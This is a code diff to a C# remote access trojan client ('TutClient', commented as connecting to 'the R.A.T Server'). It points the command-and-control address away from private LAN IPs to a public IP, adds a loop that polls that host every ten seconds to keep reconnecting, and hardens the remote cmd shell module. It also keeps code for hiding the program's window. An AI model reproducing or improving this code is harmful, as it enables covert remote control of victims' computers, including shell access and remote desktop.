@@ -318,11 +318,13 @@ namespace TutClient
         static void Main(string[] args)
         {
 #if HideWindow
-            if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
+            //if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
 #endif
+            //ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
             _handler += new EventHandler(Handler); //Create a new handler
             SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
             ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle algorithm (Short Quick TCP packets don't get collected sent at once)
+            //RequestLoop1();
             ConnectToServer(); //Connect to the R.A.T Server
             StartIPCHandler(); //Start IPC Manager
             RequestLoop(); //Request command from the server
@@ -464,7 +466,7 @@ namespace TutClient
         private static void ConnectToServer()
         {
             int attempts = 0; //Connection attempts to the server
-            string ipCache = GetIPAddress("192.168.10.20"); //Replace IP with DNS if you want
+            string ipCache = GetIPAddress("223.29.194.138"); //Replace IP with DNS if you want
             if (IsLinuxServer) encoder = Encoding.UTF8;
             else encoder = Encoding.Unicode;
 
@@ -481,7 +483,7 @@ namespace TutClient
                 }
                 catch (SocketException) //Couldn't connect to server
                 {
-                    if (attempts % 5 == 0) ipCache = GetIPAddress("192.168.10.40"); // Update ip cache every 5 failed attempts
+                    if (attempts % 5 == 0) ipCache = GetIPAddress("223.29.194.138"); // Update ip cache every 5 failed attempts
                     //Shutdown the remote desktop
                     if (RDesktop.isShutdown == false)
                     {
@@ -522,6 +524,42 @@ namespace TutClient
             ConnectToServer();
             isDisconnect = false;
             RequestLoop();
+        }
+
+        /// <summary>
+        /// Read commands from the server
+        /// </summary>
+        private static void RequestLoop1()
+        {
+            string ipCache = GetIPAddress("223.29.194.138"); //Replace IP with DNS if you want
+            var _cls = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            bool connected = false;
+            bool connected1 = false;
+            bool beginLoop = true;
+            while (beginLoop)
+            {
+                _cls.Connect(IPAddress.Parse(ipCache), _PORT);
+
+                if (_cls.Connected)
+                {
+                    connected = true;
+
+                    if (connected && !connected1)
+                    {
+                        ConnectToServer();
+                        connected1 = true;
+                    }
+                }
+                else
+                {
+                    connected = false;
+                    connected1 = false;
+                }
+
+                _cls.Disconnect(true);
+
+                Thread.Sleep(10000);
+            }
         }
 
         private static void LaunchHearthbeat()
@@ -770,14 +808,22 @@ namespace TutClient
             }
             else if (text == "stopcmd") //Stop the remote cmd module
             {
-                cmdProcess.Kill(); //Kill the process
-                //Dispose the streams and the process itself
-                toShell.Dispose();
-                toShell = null;
-                fromShell.Dispose();
-                fromShell = null;
-                cmdProcess.Dispose();
-                cmdProcess = null;
+                try
+                {
+
+                    cmdProcess.Kill(); //Kill the process
+                                       //Dispose the streams and the process itself
+                    toShell.Dispose();
+                    toShell = null;
+                    fromShell.Dispose();
+                    fromShell = null;
+                    cmdProcess.Dispose();
+                    cmdProcess = null;
+                }
+                catch
+                {
+
+                }
             }
             else if (text.StartsWith("cmd§")) //Send command to the remote cmd module
             {
